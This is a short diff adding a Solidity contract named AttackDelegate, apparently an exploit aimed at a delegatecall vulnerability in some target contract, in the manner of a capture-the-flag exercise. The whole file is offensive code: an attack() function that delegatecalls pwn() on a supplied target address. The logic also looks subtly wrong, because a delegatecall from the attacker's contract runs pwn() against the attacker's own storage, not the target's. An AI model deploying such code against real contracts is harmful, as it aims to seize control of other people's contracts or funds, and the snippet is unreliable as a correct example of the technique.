@@ -1,0 +1,2 @@
+pragma solidity ^0.8.0;
+contract AttackDelegate { function attack(address target) public { (bool success, ) = target.delegatecall(abi.encodeWithSignature("pwn()")); require(success, "Delegate call failed"); } }
